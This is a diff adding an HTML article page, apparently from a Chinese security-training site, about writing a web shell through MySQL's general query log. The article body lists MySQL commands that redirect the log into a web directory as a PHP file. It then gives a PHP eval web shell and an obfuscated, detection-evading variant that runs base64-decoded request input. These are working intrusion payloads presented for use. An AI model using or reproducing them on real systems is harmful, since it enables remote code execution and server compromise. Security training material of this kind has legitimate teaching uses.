@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>news-details</title>
+    <!--======== Font stylesheet ========-->
+    <link rel="stylesheet" href="./CSS/font.css">
+    <!--======== Nav stylesheet ========-->
+    <link rel="stylesheet" href="./CSS/navbar.css">
+    <!--======== Content stylesheet =======-->
+    <link rel="stylesheet" href="./CSS/news/news-content.css">
+    <!--======== Footer stylesheet =======-->
+    <link rel="stylesheet" href="./CSS/footer.css">
+    <style>
+        body {
+            font-family: 'Poppins', 'Hind Siliguri', sans-serif;
+        }
+    </style>
+</head>
+<body>
+<!--======== NavBar-Page-Start =======-->
+<header id="header">
+    <div class="container">
+        <div class="header-left">
+            <a class="block header-img">
+            </a>
+        </div>
+        <div class="header-right">
+            <div class="header-right-box-left">
+                <nav>
+                    <ul class="header-nav-ul">
+                        <li class="nav-li"><a href="index.html" class="nav-font">首页</a></li>
+                        <li class="nav-li"><a href="about.html" class="nav-font">关于我们</a></li>
+                        <li class="nav-li"><a href="product.html" class="nav-font">在线靶场</a></li>
+                        <li class="nav-li"><a href="news.html" class="nav-font">最新动态</a></li>
+                        <li class="nav-li"><a href="suggestions.html" class="nav-font">意见反馈</a></li>
+                    </ul>
+                </nav>
+            </div>
+            <div class="header-right-box-right">
+                <nav>
+                    <a href="" class="nav-register nav-font">Sign Up</a>
+                    <a href="" id="nav-login-font" class="nav-login">Sign In</a>
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+<section style="background: #3056d3;height: 50vh;display: flex;justify-content: center;
+                            align-items: center;font-size: 60px;color: #ffffff;">
+    <h1>文章详情</h1>
+</section>
+<!--======== Content-Page-home =======-->
+<section>
+    <div class="main-container">
+        <div class="content-title">
+            <a href="index.html" class="brand">首页</a>
+            <span class="brand">></span>
+            <a href="news.html" class="brand">公司新闻</a>
+            <span class="brand">></span>
+            <a href="" class="brand">SQL语句利用日志写shell</a>
+        </div>
+        <div class="content-box">
+            <div><h1 style="text-align: center">SQL语句利用日志写shell</h1></div>
+            <div class="content-text">
+                <p>outfile被禁止，或者写入文件被拦截</p>
+                <p>在数据库中操作如下：（必须是root权限）</p>
+                <p>1.<code>show variables like ‘%general%&#39;; #</code>查看配置</p>
+                <p>2.<code>set global general_log = on; #</code>开启general log模式</p>
+                <p>3.<code>set global general_log_file = ‘/var/www/html/1.php&#39;; #</code>设置日志目录为shell地址</p>
+                <p>4.<code>select ‘&lt;?php eval($_POST[cmd]);?&gt;’ #</code>写入shell</p>
+                <p>不成功的案例，如果mysql 被降权，是无法写入到其他的站点目录的，除非你的目标目录是可以写入的。</p>
+                <p>SQL查询免杀shell的语句</p>
+                <p>
+                    <code>SELECT “&lt;?php $p =
+                        array(‘f’=&gt;’a’,’pffff’=&gt;’s’,’e’=&gt;’fffff’,’lfaaaa’=&gt;’r’,’nnnnn’=&gt;’t’);$a
+                        = array_keys($p);$_=$p[‘pffff’].$p[‘pffff’].$a[2];$_=
+                        ‘a’.$_.’rt&#39;;$_(base64_decode($_REQUEST[‘username’]));?&gt;”
+                    </code>
+                </p>
+            </div>
+            <div class="tages-box">
+                <p class="tages" style="color:#bdbdbd;"> 标签：
+                    <span style="background: #3498DB">日志</span>
+                    <span style="background: #3498DB">shell</span>
+                </p>
+                <p class="tages-footer" style="color:#bdbdbd;">
+                    作者:<span class="t-span"> 墨客</span>
+                    来源:<span class="t-span"> 互联网</span>
+                    浏览量:<span class="t-span"> 10765</span>
+                    时间: <span> 2021-6-10</span>
+                </p>
+            </div>
+        </div>
+    </div>
+</section>
+<!--======== Footer-Page-Start =======-->
+<footer>
+    <div class="footer-container">
+        <div class="footer-top-box">
+            <h1 class="footer-about-h1">Contact Us</h1>
+            <ul class="footer-top-ul">
+                <li>Phone：0591-66666999</li>
+                <li>E-mail：diaoyukuailai@gmail.hk</li>
+                <li>Address：FuJian FuzhouLianJianxian FUJIAN BUSINESS UNIVERSITY</li>
+            </ul>
+        </div>
+        <div>
+            <div class="footer-wechat-image">
+                <img width="120" height="120" src="./image/wechat.png" alt="image">
+            </div>
+            <div class="footer-wechat-font">
+                <h3>Scan WeChat</h3>
+                <h3>Follow us</h3>
+            </div>
+        </div>
+    </div>
+    <hr>
+    <div class="footer-container">
+        <div class="footer-bottom-ul-left">
+            <ul>
+                <li><a href="#">privacy policy</a></li>
+                <li><a href="#">legal notice</a></li>
+                <li><a href="#">terms of service</a></li>
+            </ul>
+        </div>
+        <div class="footer-bottom-ul-right">
+            <ul>
+                <li>Designed and Developed by</li>
+                <li><a href="#">Heweijie</a></li>
+            </ul>
+        </div>
+    </div>
+    <hr>
+    <div class="footer-container">
+        <div class="footer-footnote">
+            <p>2022 ©朔风 - 闽ICP备2022007194号</p>
+        </div>
+    </div>
+</footer>
+</body>
+<!--========  Nav JavaScript ========-->
+<script src="./JS/nav-transform.js"></script>
+</html>
